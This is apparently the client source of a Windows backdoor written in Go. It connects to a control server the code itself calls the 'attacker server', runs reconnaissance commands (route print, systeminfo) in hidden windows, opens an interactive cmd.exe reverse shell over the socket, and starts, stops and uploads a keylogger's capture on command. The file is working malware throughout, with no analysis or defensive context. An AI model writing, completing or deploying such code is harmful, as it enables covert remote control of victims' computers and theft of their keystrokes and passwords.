package main

import (
	"KBHook"
	"fmt"
	"io"
	"log"
	"net"
	"os/exec"
	"strings"
	"syscall"
)

// Shell path. Depends system
const cmdPath = "C:\\Windows\\System32\\cmd.exe"
var serverIP = "127.0.0.1:80"

func main(){

	// Set up tcp connection with control server
	fmt.Println("Contacting attacker server")
	conn, err := net.Dial("tcp", serverIP)
	if err != nil {
		log.Fatal(err)
		return
	}

	// buf holds bytes message from tcp conn
	buf := make([]byte, 4080)

	// This chan control keylogger state
	strChanKeyLogManager := make(chan string)

	// infinite loop. Wait cmd from server
	for {

		// Read bytes message from tcp conn
		n, err := conn.Read(buf)
		if err != nil {
			if err != io.EOF {
				fmt.Println("read error:", err)
				return
			}
		}

		// Transform bytes message to string cmd
		receivedCmd := string(buf[:n])
		receivedCmd = strings.TrimSuffix(receivedCmd, "\n")
		fmt.Println(receivedCmd)

		// Simple route cmd call. Output redirect to conn stream
		if receivedCmd == "route" {
			cmdInstance := exec.Command(cmdPath, "/q", "/c", "route", "print")

			// Set-up io streams to conn. Set option to hide windows when calling system command
			cmdInstance.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			cmdInstance.Stdout = conn
			cmdInstance.Stderr = conn

			err = cmdInstance.Run()
		}

		// Simple systeminfo call. Output redirect to conn stream
		if receivedCmd == "systeminfo" {
			cmdInstance := exec.Command(cmdPath, "/q", "/c", "systeminfo")

			// Set-up o streams to conn. Set option to hide windows when calling system command
			cmdInstance.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			cmdInstance.Stdout = conn
			cmdInstance.Stderr = conn

			err = cmdInstance.Run()
		}

		// Call system shell. IO redirect to conn steams
		if receivedCmd == "shell" {
			cmdInstance := exec.Command(cmdPath)

			// Set-up o streams to conn. Set option to hide windows when calling system command
			cmdInstance.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			cmdInstance.Stdout = conn
			cmdInstance.Stdin = conn
			cmdInstance.Stderr = conn

			err = cmdInstance.Run()
		}

		// Launch goroutine which start the keylogger
		if receivedCmd == "startLog" {
			go KBHook.StartKBHook(strChanKeyLogManager)
		}

		// Send stop string cmd to keylogger channel. It stop the keylogger
		if receivedCmd == "stopLog" {
			strChanKeyLogManager <- "stopLog"
		}

		// Send log string cmd to keylogger channel. it prints the logs to the conn stream
		if receivedCmd == "getLog" {
			(strChanKeyLogManager) <- "getLog"
			logRsl := <- (strChanKeyLogManager)
			fmt.Fprintln(conn, logRsl)
		}

		// Close the client
		if receivedCmd == "bye" {
			close(strChanKeyLogManager)
			conn.Close()
			return
		}

	}
}
